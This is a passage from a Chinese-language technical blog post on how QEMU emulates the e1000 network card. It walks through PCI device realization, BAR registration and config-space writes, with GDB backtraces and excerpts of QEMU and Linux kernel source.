0x0000555555bdbf8c in qmp_x_exit_preconfig (errp=0x555557061f60 &lt;error_fatal&gt;) at ../../qemu/system/vl.c:2706</span></span><br><span class="line"><span class="comment">//#14 0x0000555555bde944 in qemu_init (argc=35, argv=0x7fffffffdb58) at ../../qemu/system/vl.c:3739</span></span><br><span class="line"><span class="comment">//#15 0x0000555555e96f93 in main (argc=35, argv=0x7fffffffdb58) at ../../qemu/system/main.c:47</span></span><br><span class="line"><span class="comment">//#16 0x00007ffff7829d90 in __libc_start_call_main (main=main@entry=0x555555e96f6f &lt;main&gt;, argc=argc@entry=35, argv=argv@entry=0x7fffffffdb58) at ../sysdeps/nptl/libc_start_call_main.h:58</span></span><br><span class="line"><span class="comment">//#17 0x00007ffff7829e40 in __libc_start_main_impl (main=0x555555e96f6f &lt;main&gt;, argc=35, argv=0x7fffffffdb58, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffdb48) at ../csu/libc-start.c:392</span></span><br><span class="line"><span class="comment">//#18 0x000055555586cc95 in _start ()</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pci_e1000_realize</span><span class="params">(PCIDevice *pci_dev, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    DeviceState *dev = DEVICE(pci_dev);</span><br><span class="line">    E1000State *d = E1000(pci_dev);</span><br><span class="line">    <span class="type">uint8_t</span> *pci_conf;</span><br><span class="line">    <span class="type">uint8_t</span> *macaddr;</span><br><span class="line"></span><br><span class="line">    pci_dev-&gt;config_write = e1000_write_config;</span><br><span class="line"></span><br><span class="line">    pci_conf = pci_dev-&gt;config;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* <span class="doctag">TODO:</span> RST# value should be 0, PCI spec 6.2.4 */</span></span><br><span class="line">    pci_conf[PCI_CACHE_LINE_SIZE] = <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">    pci_conf[PCI_INTERRUPT_PIN] = <span class="number">1</span>; <span class="comment">/* interrupt pin A */</span></span><br><span class="line"></span><br><span class="line">    e1000_mmio_setup(d);</span><br><span class="line"></span><br><span class="line">    pci_register_bar(pci_dev, <span class="number">0</span>, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;d-&gt;mmio);</span><br><span class="line"></span><br><span class="line">    pci_register_bar(pci_dev, <span class="number">1</span>, PCI_BASE_ADDRESS_SPACE_IO, &amp;d-&gt;io);</span><br><span class="line"></span><br><span class="line">    qemu_macaddr_default_if_unset(&amp;d-&gt;conf.macaddr);</span><br><span class="line">    macaddr = d-&gt;conf.macaddr.a;</span><br><span class="line"></span><br><span class="line">    e1000x_core_prepare_eeprom(d-&gt;eeprom_data,</span><br><span class="line">                               e1000_eeprom_template,</span><br><span class="line">                               <span class="keyword">sizeof</span>(e1000_eeprom_template),</span><br><span class="line">                               PCI_DEVICE_GET_CLASS(pci_dev)-&gt;device_id,</span><br><span class="line">                               macaddr);</span><br><span class="line"></span><br><span class="line">    d-&gt;nic = qemu_new_nic(&amp;net_e1000_info, &amp;d-&gt;conf,</span><br><span class="line">                          object_get_typename(OBJECT(d)), dev-&gt;id,</span><br><span class="line">                          &amp;dev-&gt;mem_reentrancy_guard, d);</span><br><span class="line"></span><br><span class="line">    qemu_format_nic_info_str(qemu_get_queue(d-&gt;nic), macaddr);</span><br><span class="line"></span><br><span class="line">    d-&gt;autoneg_timer = timer_new_ms(QEMU_CLOCK_VIRTUAL, e1000_autoneg_timer, d);</span><br><span class="line">    d-&gt;mit_timer = timer_new_ns(QEMU_CLOCK_VIRTUAL, e1000_mit_timer, d);</span><br><span class="line">    d-&gt;flush_queue_timer = timer_new_ms(QEMU_CLOCK_VIRTUAL,</span><br><span class="line">                                        e1000_flush_queue_timer, d);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pci_qdev_realize</span><span class="params">(DeviceState *qdev, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    PCIDevice *pci_dev = (PCIDevice *)qdev;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">    pci_dev = do_pci_register_device(pci_dev,</span><br><span class="line">                                     object_get_typename(OBJECT(qdev)),</span><br><span class="line">                                     pci_dev-&gt;devfn, errp);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (pc-&gt;realize) &#123;</span><br><span class="line">        pc-&gt;realize(pci_dev, &amp;local_err);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">qdev_realize</span><span class="params">(DeviceState *dev, BusState *bus, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    assert(!dev-&gt;realized &amp;&amp; !dev-&gt;parent_bus);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bus) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!qdev_set_parent_bus(dev, bus, errp)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        assert(!DEVICE_GET_CLASS(dev)-&gt;bus_type);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> object_property_set_bool(OBJECT(dev), <span class="string">&quot;realized&quot;</span>, <span class="literal">true</span>, errp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DeviceState *<span class="title function_">qdev_device_add_from_qdict</span><span class="params">(<span class="type">const</span> QDict *opts,</span></span><br><span class="line"><span class="params">                                        <span class="type">bool</span> from_json, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    DeviceClass *dc;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *driver, *path;</span><br><span class="line">    <span class="type">char</span> *id;</span><br><span class="line">    DeviceState *dev = <span class="literal">NULL</span>;</span><br><span class="line">    BusState *bus = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    driver = qdict_get_try_str(opts, <span class="string">&quot;driver&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!driver) &#123;</span><br><span class="line">        error_setg(errp, QERR_MISSING_PARAMETER, <span class="string">&quot;driver&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* find driver */</span></span><br><span class="line">    dc = qdev_get_device_class(&amp;driver, errp);</span><br><span class="line">    <span class="keyword">if</span> (!dc) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* find bus */</span></span><br><span class="line">    path = qdict_get_try_str(opts, <span class="string">&quot;bus&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (path != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        bus = qbus_find(path, errp);</span><br><span class="line">        <span class="keyword">if</span> (!bus) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!object_dynamic_cast(OBJECT(bus), dc-&gt;bus_type)) &#123;</span><br><span class="line">            error_setg(errp, <span class="string">&quot;Device &#x27;%s&#x27; can&#x27;t go on %s bus&quot;</span>,</span><br><span class="line">                       driver, object_get_typename(OBJECT(bus)));</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (dc-&gt;bus_type != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        bus = qbus_find_recursive(sysbus_get_default(), <span class="literal">NULL</span>, dc-&gt;bus_type);</span><br><span class="line">        <span class="keyword">if</span> (!bus || qbus_is_full(bus)) &#123;</span><br><span class="line">            error_setg(errp, <span class="string">&quot;No &#x27;%s&#x27; bus found for device &#x27;%s&#x27;&quot;</span>,</span><br><span class="line">                       dc-&gt;bus_type, driver);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">/* create device */</span></span><br><span class="line">    dev = qdev_new(driver);</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!qdev_realize(dev, bus, errp)) &#123;</span><br><span class="line">        <span class="keyword">goto</span> err_del_dev;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dev;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以看到，在初始化<strong>e1000</strong>对象后，其又被迅速实例化。根据<a href="/2024/07/31/qemu%E8%AE%BE%E5%A4%87%E6%A8%A1%E5%9E%8B/" title="qemu设备模型">qemu设备模型</a>中类初始化可知，<strong>DeviceClass</strong>类在实例化时会调用类初始化设置的<strong>realized</strong>属性的setter方法<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/core/qdev.c#L470"><strong>device_set_realized()</strong></a>，并在该方法中调用类的<strong>realize</strong>函数指针，即<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/net/e1000.c#L1637">pci_e1000_realize()</a>函数</p><p>其中，在<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/core/qdev.c#L280"><strong>qdev_realize()</strong></a>和<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/core/qdev.c#L280"><strong>do_pci_register_device()</strong></a>中完成了<strong>PCI设备</strong>的编号，从而可以让前面介绍的<a href="#对象初始化-1">PCI桥</a>根据PCI设备编号定位<strong>PCI设备</strong></p><p>除此之外，<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/net/e1000.c#L1637">pci_e1000_realize()</a>还初始化了其<strong>PCI设置空间</strong>，包括<strong>配置空间头</strong>(<strong>config</strong>字段)、<strong>mmio bar</strong>和<strong>pio bar</strong>。但需要注意的是，这里仅仅是初始化了<strong>bar</strong>的相关数据结构，但并没有映射到设备的地址空间，<strong>guest</strong>此时是看不到<strong>bar</strong>对应的地址空间，即从<strong>AddressSpace</strong>是找到不到该<strong>MemoryRegion</strong>的，需要后续<strong>guest</strong>配置完<strong>PCI设置空间</strong>后才会完成映射。具体来说，其通过<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/pci/pci.c#L1301"><strong>pci_register_bar()</strong></a>，向<strong>PCIDevice</strong>的<strong>io_regions</strong>字段注册了<strong>BAR</strong>的<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/include/hw/pci/pci.h#L143"><strong>struct PCIIORegion</strong></a>的数据结构，但并未将这部分地址空间的<strong>MemoryRegion</strong>映射到对应的<strong>AddressSpace</strong>上，其会推迟到<strong>guest</strong>完成设备的<strong>PCI设置空间</strong>的配置后在进行映射，所以此时Qemu在处理<strong>guest</strong>对这部分地址空间的请求时并不会分派到上述的<strong>MemoryRegion</strong>中。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">pci_register_bar</span><span class="params">(PCIDevice *pci_dev, <span class="type">int</span> region_num,</span></span><br><span class="line"><span class="params">                      <span class="type">uint8_t</span> type, MemoryRegion *memory)</span></span><br><span class="line">&#123;</span><br><span class="line">    PCIIORegion *r;</span><br><span class="line">    <span class="type">uint32_t</span> addr; <span class="comment">/* offset in pci config space */</span></span><br><span class="line">    <span class="type">uint64_t</span> wmask;</span><br><span class="line">    <span class="type">pcibus_t</span> size = memory_region_size(memory);</span><br><span class="line">    <span class="type">uint8_t</span> hdr_type;</span><br><span class="line">    ...</span><br><span class="line">    r = &amp;pci_dev-&gt;io_regions[region_num];</span><br><span class="line">    r-&gt;addr = PCI_BAR_UNMAPPED;</span><br><span class="line">    r-&gt;size = size;</span><br><span class="line">    r-&gt;type = type;</span><br><span class="line">    r-&gt;memory = memory;</span><br><span class="line">    r-&gt;address_space = type &amp; PCI_BASE_ADDRESS_SPACE_IO</span><br><span class="line">                        ? pci_get_bus(pci_dev)-&gt;address_space_io</span><br><span class="line">                        : pci_get_bus(pci_dev)-&gt;address_space_mem;</span><br><span class="line"></span><br><span class="line">    wmask = ~(size - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (region_num == PCI_ROM_SLOT) &#123;</span><br><span class="line">        <span class="comment">/* ROM enable bit is writable */</span></span><br><span class="line">        wmask |= PCI_ROM_ADDRESS_ENABLE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    addr = pci_bar(pci_dev, region_num);</span><br><span class="line">    pci_set_long(pci_dev-&gt;config + addr, type);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(r-&gt;type &amp; PCI_BASE_ADDRESS_SPACE_IO) &amp;&amp;</span><br><span class="line">        r-&gt;type &amp; PCI_BASE_ADDRESS_MEM_TYPE_64) &#123;</span><br><span class="line">        pci_set_quad(pci_dev-&gt;wmask + addr, wmask);</span><br><span class="line">        pci_set_quad(pci_dev-&gt;cmask + addr, ~<span class="number">0ULL</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        pci_set_long(pci_dev-&gt;wmask + addr, wmask &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">        pci_set_long(pci_dev-&gt;cmask + addr, <span class="number">0xffffffff</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="PCI配置"><a href="#PCI配置" class="headerlink" title="PCI配置"></a>PCI配置</h3><p>此刻Qemu已经准备好<strong>e1000</strong>模拟设备的所有数据信息，可以模拟<strong>e1000</strong>设备与<strong>guest</strong>进行交互，首先就是<strong>e1000</strong>设备的<strong>PCI设置空间</strong>的配置</p><h4 id="指定设备"><a href="#指定设备" class="headerlink" title="指定设备"></a>指定设备</h4><p>根据前面<a href="#PCI配置空间">PCI配置空间</a>和<a href="#对象初始化">PCIHost对象初始化</a>可知，Qemu使用<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/pci/pci_host.c#L158"><strong>pci_host_config_write()</strong></a>来模拟Qemu对<strong>CONFIG_ADDRESS</strong>寄存器的写操作，从而指定后续<strong>PCI配置</strong>的<strong>PCI设备</strong>，如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//#0  pci_host_config_write (opaque=0x5555573de7c0, addr=0, val=2147489796, len=4) at ../../qemu/hw/pci/pci_host.c:161</span></span><br><span class="line"><span class="comment">//#1  0x0000555555e19a00 in memory_region_write_accessor (mr=0x5555573deaf0, addr=0, value=0x7ffff6954598, size=4, shift=0, mask=4294967295, attrs=...) at ../../qemu/system/memory.c:497</span></span><br><span class="line"><span class="comment">//#2  0x0000555555e19d39 in access_with_adjusted_size (addr=0, value=0x7ffff6954598, size=4, access_size_min=1, access_size_max=4, access_fn=0x555555e19906 &lt;memory_region_write_accessor&gt;, mr=0x5555573deaf0, attrs=...) at ../../qemu/system/memory.c:573</span></span><br><span class="line"><span class="comment">//#3  0x0000555555e1d053 in memory_region_dispatch_write (mr=0x5555573deaf0, addr=0, data=2147489796, op=MO_32, attrs=...) at ../../qemu/system/memory.c:1521</span></span><br><span class="line"><span class="comment">//#4  0x0000555555e2b7a0 in flatview_write_continue_step (attrs=..., buf=0x7ffff7f8a000 &quot;\004\030&quot;, len=4, mr_addr=0, l=0x7ffff6954680, mr=0x5555573deaf0) at ../../qemu/system/physmem.c:2713</span></span><br><span class="line"><span class="comment">//#5  0x0000555555e2b870 in flatview_write_continue (fv=0x7ffee828b430, addr=3320, attrs=..., ptr=0x7ffff7f8a000, len=4, mr_addr=0, l=4, mr=0x5555573deaf0) at ../../qemu/system/physmem.c:2743</span></span><br><span class="line"><span class="comment">//#6  0x0000555555e2b982 in flatview_write (fv=0x7ffee828b430, addr=3320, attrs=..., buf=0x7ffff7f8a000, len=4) at ../../qemu/system/physmem.c:2774</span></span><br><span class="line"><span class="comment">//#7  0x0000555555e2bdd0 in address_space_write (as=0x55555704dc80 &lt;address_space_io&gt;, addr=3320, attrs=..., buf=0x7ffff7f8a000, len=4) at ../../qemu/system/physmem.c:2894</span></span><br><span class="line"><span class="comment">//#8  0x0000555555e2be4c in address_space_rw (as=0x55555704dc80 &lt;address_space_io&gt;, addr=3320, attrs=..., buf=0x7ffff7f8a000, len=4, is_write=true) at ../../qemu/system/physmem.c:2904</span></span><br><span class="line"><span class="comment">//#9  0x0000555555e85476 in kvm_handle_io (port=3320, attrs=..., data=0x7ffff7f8a000, direction=1, size=4, count=1) at ../../qemu/accel/kvm/kvm-all.c:2631</span></span><br><span class="line"><span class="comment">//#10 0x0000555555e85de6 in kvm_cpu_exec (cpu=0x5555573a0db0) at ../../qemu/accel/kvm/kvm-all.c:2903</span></span><br><span class="line"><span class="comment">//#11 0x0000555555e88eb8 in kvm_vcpu_thread_fn (arg=0x5555573a0db0) at ../../qemu/accel/kvm/kvm-accel-ops.c:50</span></span><br><span class="line"><span class="comment">//#12 0x00005555560b2687 in qemu_thread_start (args=0x5555573aa760) at ../../qemu/util/qemu-thread-posix.c:541</span></span><br><span class="line"><span class="comment">//#13 0x00007ffff7894ac3 in start_thread (arg=&lt;optimized out&gt;) at ./nptl/pthread_create.c:442</span></span><br><span class="line"><span class="comment">//#14 0x00007ffff7926850 in clone3 () at ../sysdeps/unix/sysv/linux/x86_64/clone3.S:81</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pci_host_config_write</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr,</span></span><br><span class="line"><span class="params">                                  <span class="type">uint64_t</span> val, <span class="type">unsigned</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    PCIHostState *s = opaque;</span><br><span class="line"></span><br><span class="line">    PCI_DPRINTF(<span class="string">&quot;%s addr &quot;</span> HWADDR_FMT_plx <span class="string">&quot; len %d val %&quot;</span>PRIx64<span class="string">&quot;\n&quot;</span>,</span><br><span class="line">                __func__, addr, len, val);</span><br><span class="line">    <span class="keyword">if</span> (addr != <span class="number">0</span> || len != <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    s-&gt;config_reg = val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以看到，<strong>guest</strong>产生了IO事件，Qemu使用<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/accel/kvm/kvm-all.c#L2624"><strong>kvm_handle_io()</strong></a>进行模拟。其在<strong>address_space_io</strong>找到前面<a href="#实例化">i440fx_pcihost实例化</a>时映射的<strong>MemoryRegion</strong>，并执行其<strong>write</strong>回调函数即<strong>pci_host_config_write()</strong>即可。</p><p>而对应的<strong>guest</strong>则是调用<a href="https://elixir.bootlin.com/linux/v6.9-rc2/source/arch/x86/include/asm/shared/io.h#L32"><strong>outl()</strong></a>向<strong>0xcf8</strong>写入对应的地址，如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//#0  0xffffffff81eaefc5 in pci_conf1_read (seg=&lt;optimized out&gt;, bus=&lt;optimized out&gt;, devfn=24, reg=4, len=2, value=0xffffc90000013bcc) at /home/hawk/Desktop/mqemu/kernel/arch/x86/pci/direct.c:33</span></span><br><span class="line"><span class="comment">//#1  0xffffffff81574518 in pci_bus_read_config_word (bus=&lt;optimized out&gt;, devfn=&lt;optimized out&gt;, pos=pos@entry=4, value=value@entry=0xffffc90000013bee) at /home/hawk/Desktop/mqemu/kernel/drivers/pci/access.c:67</span></span><br><span class="line"><span class="comment">//#2  0xffffffff81574932 in pci_read_config_word (dev=dev@entry=0xffff888100863000, where=where@entry=4, val=val@entry=0xffffc90000013bee) at /home/hawk/Desktop/mqemu/kernel/drivers/pci/access.c:562</span></span><br><span class="line"><span class="comment">//#3  0xffffffff81588055 in pci_enable_resources (dev=dev@entry=0xffff888100863000, mask=67) at /home/hawk/Desktop/mqemu/kernel/drivers/pci/setup-res.c:490</span></span><br><span class="line"><span class="comment">//#4  0xffffffff81eb31ad in pcibios_enable_device (dev=0xffff888100863000, mask=&lt;optimized out&gt;) at /home/hawk/Desktop/mqemu/kernel/arch/x86/pci/common.c:695</span></span><br><span class="line"><span class="comment">//#5  0xffffffff815812d3 in do_pci_enable_device (bars=67, dev=0xffff888100863000) at /home/hawk/Desktop/mqemu/kernel/drivers/pci/pci.c:2022</span></span><br><span class="line"><span class="comment">//#6  do_pci_enable_device (dev=0xffff888100863000, bars=67) at /home/hawk/Desktop/mqemu/kernel/drivers/pci/pci.c:2007</span></span><br><span class="line"><span class="comment">//#7  0xffffffff81582c67 in pci_enable_device_flags (dev=dev@entry=0xffff888100863000, flags=flags@entry=768) at /home/hawk/Desktop/mqemu/kernel/drivers/pci/pci.c:2107</span></span><br><span class="line"><span class="comment">//#8  0xffffffff81582cde in pci_enable_device (dev=dev@entry=0xffff888100863000) at /home/hawk/Desktop/mqemu/kernel/drivers/pci/pci.c:2154</span></span><br><span class="line"><span class="comment">//#9  0xffffffff8199c7c2 in e1000_probe (pdev=0xffff888100863000, ent=&lt;optimized out&gt;) at /home/hawk/Desktop/mqemu/kernel/drivers/net/ethernet/intel/e1000/e1000_main.c:940</span></span><br><span class="line"><span class="comment">//#10 0xffffffff81584ba2 in local_pci_probe (_ddi=_ddi@entry=0xffffc90000013d30) at /home/hawk/Desktop/mqemu/kernel/drivers/pci/pci-driver.c:324</span></span><br><span class="line"><span class="comment">//#11 0xffffffff81585add in pci_call_probe (id=&lt;optimized out&gt;, dev=0xffff888100863000, drv=&lt;optimized out&gt;) at /home/hawk/Desktop/mqemu/kernel/drivers/pci/pci-driver.c:392</span></span><br><span class="line"><span class="comment">//#12 __pci_device_probe (pci_dev=0xffff888100863000, drv=&lt;optimized out&gt;) at /home/hawk/Desktop/mqemu/kernel/drivers/pci/pci-driver.c:417</span></span><br><span class="line"><span class="comment">//#13 pci_device_probe (dev=0xffff8881008630c0) at /home/hawk/Desktop/mqemu/kernel/drivers/pci/pci-driver.c:451</span></span><br><span class="line"><span class="comment">//#14 0xffffffff818bd81c in call_driver_probe (drv=0xffffffff82bfe808 &lt;e1000_driver+104&gt;, dev=0xffff8881008630c0) at /home/hawk/Desktop/mqemu/kernel/drivers/base/dd.c:578</span></span><br><span class="line"><span class="comment">//#15 really_probe (dev=dev@entry=0xffff8881008630c0, drv=drv@entry=0xffffffff82bfe808 &lt;e1000_driver+104&gt;) at /home/hawk/Desktop/mqemu/kernel/drivers/base/dd.c:656</span></span><br><span class="line"><span class="comment">//#16 0xffffffff818bda8e in __driver_probe_device (drv=drv@entry=0xffffffff82bfe808 &lt;e1000_driver+104&gt;, dev=dev@entry=0xffff8881008630c0) at /home/hawk/Desktop/mqemu/kernel/drivers/base/dd.c:798</span></span><br><span class="line"><span class="comment">//#17 0xffffffff818bdb69 in driver_probe_device (drv=drv@entry=0xffffffff82bfe808 &lt;e1000_driver+104&gt;, dev=dev@entry=0xffff8881008630c0) at /home/hawk/Desktop/mqemu/kernel/drivers/base/dd.c:828</span></span><br><span class="line"><span class="comment">//#18 0xffffffff818bdde5 in __driver_attach (data=0xffffffff82bfe808 &lt;e1000_driver+104&gt;, dev=0xffff8881008630c0) at /home/hawk/Desktop/mqemu/kernel/drivers/base/dd.c:1214</span></span><br><span class="line"><span class="comment">//#19 __driver_attach (dev=0xffff8881008630c0, data=0xffffffff82bfe808 &lt;e1000_driver+104&gt;) at /home/hawk/Desktop/mqemu/kernel/drivers/base/dd.c:1154</span></span><br><span class="line"><span class="comment">//#20 0xffffffff818bb5b7 in bus_for_each_dev (bus=&lt;optimized out&gt;, start=start@entry=0x0 &lt;fixed_percpu_data&gt;, data=data@entry=0xffffffff82bfe808 &lt;e1000_driver+104&gt;, fn=fn@entry=0xffffffff818bdd60 &lt;__driver_attach&gt;) at /home/hawk/Desktop/mqemu/kernel/drivers/base/bus.c:368</span></span><br><span class="line"><span class="comment">//#21 0xffffffff818bd1f9 in driver_attach (drv=drv@entry=0xffffffff82bfe808 &lt;e1000_driver+104&gt;) at /home/hawk/Desktop/mqemu/kernel/drivers/base/dd.c:1231</span></span><br><span class="line"><span class="comment">//#22 0xffffffff818bc997 in bus_add_driver (drv=drv@entry=0xffffffff82bfe808 &lt;e1000_driver+104&gt;) at /home/hawk/Desktop/mqemu/kernel/drivers/base/bus.c:673</span></span><br><span class="line"><span class="comment">//#23 0xffffffff818bef8b in driver_register (drv=drv@entry=0xffffffff82bfe808 &lt;e1000_driver+104&gt;) at /home/hawk/Desktop/mqemu/kernel/drivers/base/driver.c:246</span></span><br><span class="line"><span class="comment">//#24 0xffffffff8158447c in __pci_register_driver (drv=drv@entry=0xffffffff82bfe7a0 &lt;e1000_driver&gt;, owner=owner@entry=0x0 &lt;fixed_percpu_data&gt;, mod_name=mod_name@entry=0xffffffff827051f5 &quot;e1000&quot;) at /home/hawk/Desktop/mqemu/kernel/drivers/pci/pci-driver.c:1450</span></span><br><span class="line"><span class="comment">//#25 0xffffffff832a4c31 in e1000_init_module () at /home/hawk/Desktop/mqemu/kernel/drivers/net/ethernet/intel/e1000/e1000_main.c:227</span></span><br><span class="line"><span class="comment">//#26 0xffffffff81001a63 in do_one_initcall (fn=0xffffffff832a4bf0 &lt;e1000_init_module&gt;) at /home/hawk/Desktop/mqemu/kernel/init/main.c:1238</span></span><br><span class="line"><span class="comment">//#27 0xffffffff832481d7 in do_initcall_level (command_line=0xffff888100333140 &quot;rdinit&quot;, level=6) at /home/hawk/Desktop/mqemu/kernel/init/main.c:1300</span></span><br><span class="line"><span class="comment">//#28 do_initcalls () at /home/hawk/Desktop/mqemu/kernel/init/main.c:1316</span></span><br><span class="line"><span class="comment">//#29 do_basic_setup () at /home/hawk/Desktop/mqemu/kernel/init/main.c:1335</span></span><br><span class="line"><span class="comment">//#30 kernel_init_freeable () at /home/hawk/Desktop/mqemu/kernel/init/main.c:1548</span></span><br><span class="line"><span class="comment">//#31 0xffffffff81ee5285 in kernel_init (unused=&lt;optimized out&gt;) at /home/hawk/Desktop/mqemu/kernel/init/main.c:1437</span></span><br><span class="line"><span class="comment">//#32 0xffffffff8103be2f in ret_from_fork (prev=&lt;optimized out&gt;, regs=0xffffc90000013f58, fn=0xffffffff81ee5270 &lt;kernel_init&gt;, fn_arg=0x0 